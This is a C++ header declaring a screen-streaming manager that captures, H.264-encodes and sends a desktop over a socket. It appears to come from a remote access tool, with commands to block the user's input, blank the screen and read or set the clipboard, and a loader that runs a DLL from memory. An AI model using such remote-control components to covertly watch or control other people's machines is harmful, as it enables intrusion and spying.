#pragma once
#include "Manager.h"
#include "MemoryModule.h"

#include "Capture.h"
#include <stdint.h>

#include "x264.h"
#include "x264_config.h"
#include "libyuv.h"

#include "pkt_queue.h"
#include "net_protocol.h"

#include <vector>
//#include "mp4record.h"


enum
{
	COMMAND_NEXT_H264CScreenSpyDlg,
	COMMAND_h264_SHOW_Cursor,
	COMMAND_h264_HIDE_Cursor,
	COMMAND_h264_SCREEN_RESET,
	COMMAND_h264_SCREEN_CONTROL,
	COMMAND_h264_SCREEN_BLOCK_INPUT,
	COMMAND_h264_SCREEN_BLANK,
	COMMAND_h264_SCREEN_CAPTURE_LAYER,
	COMMAND_h264_SCREEN_GET_CLIPBOARD,
	COMMAND_h264_SCREEN_SET_CLIPBOARD,
	COMMAND_h264_SCREEN_CHANGE_MONITORS,
	TOKEN_H264SCREEN,
	TOKEN_h264CLIPBOARD_TEXT,
};



struct MYtagMSG { //自定义控制消息


	UINT        lParam;
	UINT        message;
	long long      wParam;
	int x;
	int y;
};


struct YUV_FRAME
{
	uint8_t* frame_buffer;
	unsigned long ms;
	x264_picture_t pic;
};

struct H264_FRAME
{
	//x264_picture_t pic;

	int     b_keyframe;
	__int64 i_pts;
	__int64 i_dts;

	size_t payload_size;

	x264_nal_t nalt_s[24];
	int nal_count;

	uint8_t* free_buffer;
	uint8_t* frame_buffer;

	unsigned long ms;

};

struct PacketReadyData
{
	PacketHead head;
	ReadyData data;
	int i;
};

class CH264ScreenManager : public CManager
{
private:

	BOOL m_buser;
	std::vector<Monitor> monitors;
	Monitor monitor;
	Capture capture;

	HANDLE thread_capture;//采集
	HANDLE thread_encoder;//编码
	HANDLE thread_push;//输出
	//HANDLE thread_recvctr;//接收控制

	volatile bool run_mark;

	queue_root* yuv_queue;//yuv队列
	HANDLE yuv_queue_event;

	queue_root* h264_queue;
	HANDLE h264_queue_event;

	std::string record_file;
	std::string x264_preset;
	std::string x264_tune;

	int bitrate;

	x264_t* x264;
	x264_param_t param;

public:
	CH264ScreenManager(ISocketBase* pClient);;
	~CH264ScreenManager();
	HMEMORYMODULE hdllmod;

	typedef void (*x264_encoder_close)(x264_t*);
	typedef  void  (*x264_picture_init)(x264_picture_t* pic);
	typedef int     (*x264_encoder_encode)(x264_t*, x264_nal_t** pp_nal, int* pi_nal, x264_picture_t* pic_in, x264_picture_t* pic_out);
	typedef void   (*x264_param_default)(x264_param_t*);
	typedef int     (*x264_param_default_preset)(x264_param_t*, const char* preset, const char* tune);
	typedef int    (*x264_param_apply_profile)(x264_param_t*, const char* profile);
	typedef  x264_t* (*x264_encoder_open)(x264_param_t* param);
	typedef uint32_t(*x264_cpu_detect)(void);

	x264_encoder_close  m_x264_encoder_close;
	x264_picture_init m_x264_picture_init;
	x264_encoder_encode m_x264_encoder_encode;
	x264_param_default m_x264_param_default;
	x264_param_default_preset m_x264_param_default_preset;
	x264_param_apply_profile m_x264_param_apply_profile;
	x264_encoder_open m_x264_encoder_open;
	x264_cpu_detect m_x264_cpu_detect;

	bool Init(const Monitor&, int fps, bool capture_cursor, int bitrate, std::string& x264_preset, std::string& x264_tune, std::string& record_file);

	void Start();

	//手动结束清理
	void StopClear();

	//等待一个结束信号
	//void WaitStop();

private:
	static unsigned __stdcall CtrlThread(LPVOID lparam);
	static unsigned int __stdcall  CaptureWork(void* arg);
	static unsigned int __stdcall  EncoderWork(void* arg);
	static unsigned int __stdcall  OutPutWork(void* arg);

	bool InitH264Encoder();



public:
	int switchMonitor;
	int fps, btl;

	MYtagMSG* m_MYtagMSG;
	int m_MYtagMSGsize;
	bool IsResolutionChange();
	static unsigned int __stdcall ResetScreen(void* arg);
	void UpdateLocalClipboard(char* buf, int len);
	void SendLocalClipboard();
	BOOL m_bIsBlankScreen;
	HANDLE	 m_hCtrlThread;
	void ProcessCommand(LPBYTE lpBuffer, UINT nSize);
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	BOOL m_bIsBlockInput;
	HDC		m_hDeskTopDC;
	Monitor capture_monitor;

	bool ischaneg;
	DWORD m_dwLastCapture;
	DWORD m_dwSleep;
};





